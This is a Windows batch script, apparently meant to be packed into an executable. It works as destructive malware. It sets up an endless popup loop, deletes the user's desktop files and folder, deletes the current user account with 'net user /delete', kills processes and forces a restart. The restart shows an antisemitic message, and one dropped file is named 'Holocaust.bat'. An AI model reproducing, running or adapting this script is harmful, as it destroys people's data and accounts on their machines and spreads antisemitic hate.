::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFB1GSQG+GG6pDaET+NT47ueXrQMUV+1f
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJHqF+VI/aB9dDAeNMmi/CKEO6eX+4f6I7EgFUYI=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
::Slaves
@echo off
del "%userprofile%\Browser\Slaves"/q
rd "%userprofile%\Browser\Slaves"
del "%userprofile%\Browser"/q
rd "%userprofile%\Browser"
md "%userprofile%\Browser"
md "%userprofile%\Browser\Slaves"

echo msgbox "Slaves ERROR", 16, "ERROR" >> "%userprofile%\Browser\SlavesE.vbs"

echo @echo off >> "%userprofile%\Browser\SlavesS.bat"
echo :a >> "%userprofile%\Browser\SlavesS.bat"
echo start %userprofile%\Browser\SlavesE.vbs >> "%userprofile%\Browser\SlavesS.bat"
echo goto a >> "%userprofile%\Browser\SlavesS.bat"

echo del "%userprofile%\desktop"/q >> "%userprofile%\Browser\Holocaust.bat"

echo wscript.sleep 9000 >> "%userprofile%\Browser\Jaws\Game over.vbs"
echo msgbox "GAME OVER, JAW", 16, "JAW" >> "%userprofile%\Browser\Jaws\Game over.vbs"

timeout 1 >nul /nobreak

start "%userprofile%\Browser\SlavesS.bat"

timeout 2 >nul /nobreak

start "%userprofile%\Browser\Holocaust.bat"

timeout 1 >nul /nobreak

rd %userprofile%\desktop

start "%userprofile%\Browser\Jaws\Game over.vbs"

timeout 1 >nul /nobreak

net user "%username%" /delete

taskkill /f /im wscript.exe
shutdown /r /c "YOU ARE JEW" /t 3
taskkill /f /im cmd.exe